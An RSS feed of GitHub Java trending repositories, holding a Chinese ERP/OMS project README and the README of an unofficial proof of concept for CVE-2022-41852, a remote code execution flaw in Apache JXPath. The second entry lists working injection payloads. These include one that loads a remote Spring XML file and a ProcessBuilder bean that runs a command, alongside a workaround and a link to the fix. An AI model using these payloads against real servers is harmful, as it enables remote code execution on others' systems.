<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Java Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-10-26T01:35:52Z</updated>
  <subtitle>Daily Trending of Java in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>FJ-OMS/oms-erp</title>
    <updated>2022-10-26T01:35:52Z</updated>
    <id>tag:github.com,2022-10-26:/FJ-OMS/oms-erp</id>
    <link href="https://github.com/FJ-OMS/oms-erp" rel="alternate"></link>
    <summary type="html">&lt;p&gt;一站式全渠道业务中台系统包括订单管理系统OMS/电商ERP、库存WMS统一管理系统和SAP财务管理系统等，实现快速部署，并帮助企业后续自主进行开发迭代，实现数字化转型，并有多个经典案例。中台系统包括：通用业务中台、强大的技术中台Springcloud/Istio、后续开发方案的设计，技术(K8S,SERVERLESS)及管理人员的培训等。&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/FJ-OMS/oms-erp/main/README_EN.md&#34;&gt;English&lt;/a&gt; | 简体中文&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;http://hits.dwyl.com/eeveek/oms&#34;&gt;&lt;img src=&#34;http://hits.dwyl.com/eeveek/oms.svg?sanitize=true&#34; alt=&#34;HitCount&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/github/downloads/eeveek/oms/total&#34; alt=&#34;GitHub All Releases&#34;&gt; &lt;a href=&#34;https://github.com/eeveek/oms/issues&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/issues/eeveek/oms&#34; alt=&#34;GitHub issues&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/github/issues-closed/eeveek/oms&#34; alt=&#34;GitHub closed issues&#34;&gt; &lt;a href=&#34;https://github.com/eeveek/oms/network&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/forks/eeveek/oms&#34; alt=&#34;GitHub forks&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/eeveek/oms/stargazers&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/stars/eeveek/oms&#34; alt=&#34;GitHub stars&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/github/v/release/eeveek/oms&#34; alt=&#34;GitHub release (latest by date)&#34;&gt; &lt;a href=&#34;https://github.com/eeveek/oms/raw/master/LICENSE&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/license/eeveek/oms&#34; alt=&#34;GitHub license&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h1&gt;开源的新零售业务中台OMS&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code&gt;全渠道一盘货订单管理系统OMS,基于业内领先的微服务架构，打造电商通用业务中台，快速部署，助力企业加速实现业务一体化与数字化转型。企业可以处理来自所有渠道的订单，降低库存仓位将资金周转率提升至少50%，减少占订单金额2%-10%左右的内部损耗，将开发部署周期减少到几周内，将开发成本控制在百万元左右，能自主可控的让系统跟上业务的变化。&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;介绍&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;项目业务中台OMS全渠道一盘货订单管理系统的内核是通过打造通用的中台系统，实现快速部署，并帮助企业后续自主进行开发迭代，来帮助企业实现数字化转型。&#xA;&#xA;提供的中台系统包括：通用业务中台、强大的技术中台、后续开发方案的设计，技术及管理人员的培训等。&#xA;&#xA;其中业务中台通过将订单、库存、财务、商品、营销等业务管理起来，构造适应新零售条件下管理模式的系统，帮助企业实现数字化条件下的转型升级。&#xA;&#xA;技术中台通过微服务架构，流水线自动部署等，实现让水平一般的程序员开发高复杂度的中台系统，降低企业在技术上的投入。&#xA;&#xA;经过方案设计和人员培训后，会为企业培养出一只自主可控有水平的技术团队，方便企业后续自主的开发系统，以跟得上快速变化的市场环境，减少总体的上线时间，降低企业运营成本。&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;帮助企业和个人解决以下的问题&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;1、全渠道订单，及线上线下订单难以融合处理的问题。&#xA;&#xA;2、库存无法共享处理，库存仓位过重的问题。&#xA;&#xA;3、财务无法实时统计，单单处理，资金周转率过低的问题。&#xA;&#xA;4、商品、价格、营销、权限等数据各自分散，无法综合管理，造成大量内部损耗的问题。&#xA;&#xA;5、开发周期长，人员要求高，成本高，整体迭代受制于人的问题。&#xA;&#xA;6、市场变化太快，系统无法及时跟得上业务的问题。&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;业务架构&lt;/strong&gt; &lt;img src=&#34;https://github.com/eeveek/oms/raw/main/%E4%B8%9A%E5%8A%A1%E6%9E%B6%E6%9E%84.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;技术架构&lt;/strong&gt; &lt;img src=&#34;https://github.com/eeveek/oms/raw/main/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;特技&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;云原生&lt;/strong&gt; &lt;img src=&#34;https://github.com/eeveek/oms/raw/main/front-end/%E4%BA%91%E5%8E%9F%E7%94%9F.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;基于分布部署和统一运管，以分布式云，以容器、微 服务、DevOps等技术为基础建立技术产品体系&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;开发&lt;/strong&gt; &lt;img src=&#34;https://github.com/eeveek/oms/raw/main/front-end/%E5%BC%80%E5%8F%91.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;包括集成GitLab的代码统一管理能力、支持多种类型的制品库管理能力、集成CI/CD的自动化流水线、内建的代码扫描与质量分析，全流程跟进开发过程&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;部署&lt;/strong&gt; &lt;img src=&#34;https://github.com/eeveek/oms/raw/main/front-end/%E9%83%A8%E7%BD%B2.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;包括集群管理、环境管理、资源管理，支持集群与环境的统一管理和集中分配，支持自动化部署流水线与一键式的手工部署，高效灵活地支撑产品运维&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;测试&lt;/strong&gt; &lt;img src=&#34;https://github.com/eeveek/oms/raw/main/front-end/%E6%B5%8B%E8%AF%95.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;包括测试用例管理、测试计划管理、测试执行管理、缺陷管理、 测试报告管理，支持手工测试并提供API测试、性能测试、流量 回归测试、UI测试等自动化测试能力，测试任务还可嵌入开发流 水线，持续测试有效保障产品质量&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;联系方式和试用&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;演示地址：https://www.flightsteed.com/ 点击导航栏上的免费试用 用户名：demo 密码:abcd1234&#xA;微信:blowbing&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/eeveek/oms/raw/main/front-end/we.png&#34; alt=&#34;img&#34;&gt; &lt;img src=&#34;https://github.com/eeveek/oms/raw/main/front-end/gzh.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;安装教程&lt;/h2&gt; &#xA;&lt;h2&gt;使用说明&lt;/h2&gt; &#xA;&lt;h2&gt;参与贡献&lt;/h2&gt;</summary>
  </entry>
  <entry>
    <title>Warxim/CVE-2022-41852</title>
    <updated>2022-10-26T01:35:52Z</updated>
    <id>tag:github.com,2022-10-26:/Warxim/CVE-2022-41852</id>
    <link href="https://github.com/Warxim/CVE-2022-41852" rel="alternate"></link>
    <summary type="html">&lt;p&gt;CVE-2022-41852 Proof of Concept (unofficial)&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Remote Code Execution in JXPath Library (CVE-2022-41852) Proof of Concept&lt;/h1&gt; &#xA;&lt;p&gt;CVE-2022-41852 allows attackers to execute code on the application server.&lt;/p&gt; &#xA;&lt;p&gt;You can read more about this vulnerability here:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hackinglab.cz/en/blog/remote-code-execution-in-jxpath-library-cve-2022-41852/&#34;&gt;https://hackinglab.cz/en/blog/remote-code-execution-in-jxpath-library-cve-2022-41852/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;i&gt;&lt;b&gt;Note:&lt;/b&gt; I am not an author of this CVE. I have only created this proof of concept.&lt;/i&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Useful Links&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/apache/commons-jxpath&#34;&gt;JXPath GitHub&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://commons.apache.org/proper/commons-jxpath/users-guide.html&#34;&gt;JXPath Website&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41852&#34;&gt;MITRE CVE-2022-41852&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2022-41852&#34;&gt;NIST CVE-2022-41852&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Vulnerability Description&lt;/h2&gt; &#xA;&lt;p&gt;JXPath library has support for running functions in XPath expressions (see &lt;a href=&#34;https://commons.apache.org/proper/commons-jxpath/users-guide.html#Standard_Extension_Functions&#34;&gt;Official User Guide&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;p&gt;For example, methods &lt;code&gt;JXPathContext.getValue(path)&lt;/code&gt; and &lt;code&gt;JXPathContext.iterate(path)&lt;/code&gt; are dangerous if you let user send input into the path parameter.&lt;/p&gt; &#xA;&lt;h2&gt;PoC Description&lt;/h2&gt; &#xA;&lt;p&gt;This PoC starts simple Spring server with two endpoints:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;/vulnerable-example?path=[path]&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;/secure-example?path=[path]&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;These endpoints have only one query parameter &#34;path&#34;.&lt;/p&gt; &#xA;&lt;h3&gt;Possible Request URLs&lt;/h3&gt; &#xA;&lt;p&gt;Following requests will work fine (will not cause any problems):&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://localhost:8080/secure-example?path=name&#34;&gt;http://localhost:8080/secure-example?path=name&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://localhost:8080/secure-example?path=website&#34;&gt;http://localhost:8080/secure-example?path=website&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://localhost:8080/secure-example?path=/&#34;&gt;http://localhost:8080/secure-example?path=/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://localhost:8080/vulnerable-example?path=name&#34;&gt;http://localhost:8080/vulnerable-example?path=name&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://localhost:8080/vulnerable-example?path=website&#34;&gt;http://localhost:8080/vulnerable-example?path=website&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://localhost:8080/vulnerable-example?path=/&#34;&gt;http://localhost:8080/vulnerable-example?path=/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Following requests will cause code to be executed:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://localhost:8080/vulnerable-example?path=java.lang.System.exit(42)&#34;&gt;http://localhost:8080/vulnerable-example?path=java.lang.System.exit(42)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://localhost:8080/vulnerable-example?path=java.lang.Thread.sleep(10000)&#34;&gt;http://localhost:8080/vulnerable-example?path=java.lang.Thread.sleep(10000)&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Example Payloads&lt;/h2&gt; &#xA;&lt;p&gt;Example payloads to detect CVE-2022-41852:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;java.lang.System.exit(42)&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;java.lang.Thread.sleep(10000)&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;/|java.lang.System.exit(42)&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;|java.lang.System.exit(42)&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;There might be various ways to execute commands. One of them is using Spring&#39;s ClassPathXmlApplicationContext:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;org.springframework.context.support.ClassPathXmlApplicationContext.new(&#34;https://warxim.com/calc.xml&#34;)&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;In the XML file, you can define bean configuration, for example, you can create instance of &lt;code&gt;ProcessBuilder&lt;/code&gt; and run specified command on the server by initializing the bean using &lt;code&gt;start()&lt;/code&gt; method. In the following example, calculator will be opened on Windows machine:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&amp;gt;&#xA;&amp;lt;beans xmlns=&#34;http://www.springframework.org/schema/beans&#34; xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xsi:schemaLocation=&#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&#34;&amp;gt;&#xA;  &amp;lt;bean id=&#34;commandRunner&#34; class=&#34;java.lang.ProcessBuilder&#34; init-method=&#34;start&#34;&amp;gt;&#xA;    &amp;lt;constructor-arg&amp;gt;&#xA;      &amp;lt;list&amp;gt;&#xA;        &amp;lt;value&amp;gt;cmd&amp;lt;/value&amp;gt;&#xA;        &amp;lt;value&amp;gt;/c&amp;lt;/value&amp;gt;&#xA;        &amp;lt;value&amp;gt;&amp;lt;![CDATA[calc]]&amp;gt;&amp;lt;/value&amp;gt;&#xA;      &amp;lt;/list&amp;gt;&#xA;    &amp;lt;/constructor-arg&amp;gt;&#xA;  &amp;lt;/bean&amp;gt;&#xA;&amp;lt;/beans&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;There is also a way to load new classes by traversing the context bean, for example, the following code will load class &lt;code&gt;com.warxim.dangerous.DangerousClass&lt;/code&gt;, create its instance and call method &lt;code&gt;run(&#34;warxim&#34;)&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;JXPathContext context = JXPathContext.newContext(new Data());&#xA;String jxPath = &#34;run(newInstance(loadClass(getClassLoader(getClass(/)), \&#34;com.warxim.dangerous.DangerousClass\&#34;)), \&#34;warxim\&#34;)&#34;&#xA;Object result = context.getValue(jxPath);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Notice that we have to call the object methods by putting the object that contains them as a first parameter.&lt;/p&gt; &#xA;&lt;h2&gt;Workaround for CVE-2022-41852&lt;/h2&gt; &#xA;&lt;p&gt;It is possible to disable functions in JXPathContext by setting functions field to empty &lt;code&gt;FunctionLibrary&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// Create path context for person object&#xA;var pathContext = JXPathContext.newContext(person);&#xA;&#xA;// Set empty function library&#xA;pathContext.setFunctions(new FunctionLibrary());&#xA;&#xA;// getValue will throw org.apache.commons.jxpath.JXPathFunctionNotFoundException&#xA;return pathContext.getValue(path);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;i&gt;&lt;b&gt;Note:&lt;/b&gt; It will disable all functions, so even functions like &lt;code&gt;size()&lt;/code&gt; will not be available.&lt;/i&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Fix&lt;/h2&gt; &#xA;&lt;p&gt;The fix is being developed, see &lt;a href=&#34;https://github.com/apache/commons-jxpath/pull/26&#34;&gt;https://github.com/apache/commons-jxpath/pull/26&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
</feed>